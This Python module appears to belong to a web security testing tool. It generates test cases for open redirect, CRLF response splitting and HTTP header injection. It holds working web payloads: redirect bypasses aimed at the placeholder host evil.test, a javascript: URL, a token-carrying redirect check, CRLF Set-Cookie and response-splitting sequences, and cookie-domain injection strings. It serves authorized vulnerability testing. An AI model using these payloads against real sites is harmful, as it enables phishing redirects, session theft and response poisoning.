"""Open redirect, CRLF / response splitting, and header injection generators.

All non-destructive. Open-redirect positives check the Location host a browser
would reach (never execution). CRLF uses an injected marker header; it never
sets a real Set-Cookie value for a victim. Attacker hosts are RFC 2606 names.
"""

from __future__ import annotations

from urllib.parse import urlsplit

from .base import Ctx, TestCase

GENERATORS: dict = {}


def _gen(name):
    def deco(fn):
        GENERATORS[name] = fn
        return fn
    return deco


EVIL = "evil.test"


def _allowed_host(ctx: Ctx) -> str:
    sample = ctx.sample_value or ""
    if "://" in sample:
        h = urlsplit(sample).hostname
        if h:
            return h
    h = urlsplit(ctx.url).hostname or "lab.test"
    return h


@_gen("open_redirect")
def gen_open_redirect(ctx: Ctx) -> list[TestCase]:
    allowed = _allowed_host(ctx)
    cases: list[TestCase] = []
    # control: a legitimate relative redirect still works (so we can tell a block from a bug)
    cases.append(TestCase(case_no=0, technique="open_redirect.control.relative", payload="/dashboard",
                          mutation=[{"op": "set_input", "value": "/dashboard"}], is_control=True,
                          positive={"type": "status_in", "values": [301, 302, 303, 307, 308, 200]},
                          negative="a normal relative redirect is rejected, so the endpoint is not a redirector or the tooling is broken",
                          description="control: a legitimate relative redirect is accepted"))
    n = 1
    # family = the bypass SHAPE (each is a distinct technique)
    shapes = [
        ("scheme", "relative", f"//{EVIL}"),
        ("scheme", "triple_slash", f"https:///{EVIL}"),
        ("backslash", "scheme", f"https:/\\{EVIL}"),
        ("backslash", "path", f"/\\/{EVIL}"),
        ("userinfo", "at", f"https://{allowed}@{EVIL}"),
        ("userinfo", "encoded_at", f"https://{allowed}%40{EVIL}"),
        ("subdomain", "suffix", f"https://{allowed}.{EVIL}"),
        ("fragment", "hash_at", f"https://{EVIL}%23@{allowed}"),
        ("whitespace", "tab", f"https://{EVIL}%09"),
        ("encoding", "double", f"https:%252f%252f{EVIL}"),
        ("nullbyte", "host", f"https://{EVIL}%00.{allowed}"),
    ]
    for family, variant, payload in shapes:
        cases.append(TestCase(case_no=n, technique=f"open_redirect.{family}.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
                              positive={"type": "location_host", "host": EVIL},
                              negative=f"the {family}/{variant} payload does not send the browser to {EVIL}",
                              rung="redirect_to_attacker", description=f"open redirect bypass: {family} {variant}"))
        n += 1
    # protocol-blind guard: a javascript: URL that passes a hostname-only check
    cases.append(TestCase(case_no=n, technique="open_redirect.bypass.protocol_blind", payload=f"javascript://{allowed}/%0aalert(1)",
                          mutation=[{"op": "set_input", "value": f"javascript://{allowed}/%0a", "raw": True}],
                          positive={"type": "any", "of": [{"type": "header_contains", "name": "Location", "value": "javascript:"},
                                                         {"type": "body_regex", "pattern": r"(?i)location(\.href)?\s*=\s*['\"]javascript:"}]},
                          negative="the javascript: URL is not placed into Location or a client-side redirect",
                          rung="redirect_to_attacker", description="protocol-blind guard accepts a javascript: URL"))
    n += 1
    # token-carrying rung: does the redirect preserve a query/fragment token to the attacker host?
    cases.append(TestCase(case_no=n, technique="open_redirect.token.carried", payload=f"https://{allowed}@{EVIL}/#t={ctx.token('t')}",
                          mutation=[{"op": "set_input", "value": f"https://{allowed}@{EVIL}/", "raw": True}],
                          positive={"type": "manual", "describe": "after confirming the redirect lands on the attacker host, check whether a session token or code travels in the URL or fragment"},
                          negative="the redirect carries no token to the attacker",
                          rung="token_carried", description="does the open redirect carry a token"))
    n += 1
    return cases


@_gen("crlf")
def gen_crlf(ctx: Ctx) -> list[TestCase]:
    tok = ctx.token("h")
    header = f"X-{tok}"
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="crlf.control.plain", payload=ctx.sample_value or "en",
                          mutation=[{"op": "set_input", "value": ctx.sample_value or "en"}], is_control=True,
                          positive={"type": "matches_base", "max_len_ratio": 0.5},
                          negative="the unmodified value does not return the baseline, so the tooling is broken",
                          description="control: the value reaches a response header normally"))
    n = 1
    # family = the newline mechanism / encoding (each a distinct technique)
    encs = [
        ("newline", "raw", f"%0d%0a{header}: 1"),
        ("newline", "lf_only", f"%0a{header}: 1"),
        ("newline", "cr_only", f"%0d{header}: 1"),
        ("encoding", "double", f"%250d%250a{header}: 1"),
        ("encoding", "unicode", f" {header}: 1"),
        ("encoding", "overlong", f"%e5%98%8a%e5%98%8d{header}: 1"),
        ("prefix", "value", f"{(ctx.sample_value or 'en')}%0d%0a{header}: 1"),
    ]
    for family, variant, payload in encs:
        cases.append(TestCase(case_no=n, technique=f"crlf.{family}.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
                              positive={"type": "header_present", "name": header},
                              negative=f"the {family}/{variant} CRLF sequence does not inject a new response header",
                              rung="header_injected", description=f"CRLF header injection: {family} {variant}"))
        n += 1
    # a Set-Cookie injection (benign marker cookie, injected into our own response only)
    cases.append(TestCase(case_no=n, technique="crlf.setcookie.marker", payload=f"%0d%0aSet-Cookie: {tok}=1",
                          mutation=[{"op": "set_input", "value": f"%0d%0aSet-Cookie: {tok}=1", "raw": True}],
                          positive={"type": "header_contains", "name": "Set-Cookie", "value": tok},
                          negative="no injected Set-Cookie appears in the response",
                          rung="header_injected", description="CRLF Set-Cookie injection (benign marker)"))
    n += 1
    # response splitting rung: inject a full second response head
    cases.append(TestCase(case_no=n, technique="crlf.split.body", payload=f"%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aX-{tok}: split",
                          mutation=[{"op": "set_input", "value": f"%0d%0aContent-Length: 0%0d%0a%0d%0aX-{tok}: split", "raw": True}],
                          positive={"type": "header_present", "name": f"X-{tok}"},
                          negative="the CRLF sequence does not split the response",
                          rung="response_split", description="CRLF response splitting"))
    n += 1
    # location variant (filename, when relevant)
    if ctx.input_location == "query":
        cases.append(TestCase(case_no=n, technique="crlf.header.from_request", payload=f"x%0d%0a{header}: 1",
                              mutation=[{"op": "move_input", "to": "header", "value": f"x%0d%0a{header}: 1"}],
                              positive={"type": "header_present", "name": header},
                              negative="the CRLF in a request header does not reflect into a response header",
                              rung="header_injected", description="CRLF from a request header value"))
        n += 1
    return cases


@_gen("header_injection")
def gen_header_injection(ctx: Ctx) -> list[TestCase]:
    tok = ctx.token("h")
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="header_injection.control.plain", payload=ctx.sample_value or "en",
                          mutation=[{"op": "set_input", "value": ctx.sample_value or "en"}], is_control=True,
                          positive={"type": "matches_base", "max_len_ratio": 0.5},
                          negative="the unmodified value does not reach a response header, so the tooling is broken",
                          description="control: the value reflects into a response header"))
    n = 1
    # separators that alter header semantics WITHOUT CRLF
    for family, variant, payload, cond in [
        ("cookie", "domain", f"{tok}; Domain={EVIL}", {"type": "header_contains", "name": "Set-Cookie", "value": f"Domain={EVIL}"}),
        ("cookie", "secure", f"{tok}; Secure; HttpOnly", {"type": "header_regex", "name": "Set-Cookie", "pattern": rf"{tok}.*Secure"}),
        ("ctype", "charset", f"text/html; charset=x-{tok}", {"type": "header_contains", "name": "Content-Type", "value": f"x-{tok}"}),
        ("link", "preconnect", f"<https://{EVIL}>; rel=preconnect", {"type": "header_contains", "name": "Link", "value": EVIL}),
        ("cache", "no_store", f"{tok}, no-store", {"type": "header_contains", "name": "Cache-Control", "value": tok}),
        ("quote", "dquote_break", f'{tok}"; x="y', {"type": "header_contains", "name": "Content-Disposition", "value": tok}),
        ("space", "value_fold", f"{tok} injected", {"type": "header_contains", "name": "X-Powered-By", "value": "injected"}),
    ]:
        cases.append(TestCase(case_no=n, technique=f"header_injection.{family}.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
                              positive=cond, negative=f"the {variant} separator does not alter header semantics",
                              rung="header_semantics_altered", description=f"header injection: {variant}"))
        n += 1
    # reflects_in_header rung: a plain marker lands in a header at all
    for family, variant, payload in [("reflect", "marker", tok), ("reflect", "spaced", f"a {tok} b"),
                                    ("reflect", "encoded", f"%20{tok}%20")]:
        cases.append(TestCase(case_no=n, technique=f"header_injection.{family}.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
                              positive={"type": "any", "of": [{"type": "header_contains", "name": "Location", "value": tok},
                                                             {"type": "header_contains", "name": "Set-Cookie", "value": tok},
                                                             {"type": "header_contains", "name": "Content-Type", "value": tok},
                                                             {"type": "header_contains", "name": "X-Powered-By", "value": tok}]},
                              negative="the value does not reflect into any response header",
                              rung="reflects_in_header", description=f"value reflects into a header: {variant}"))
        n += 1
    return cases
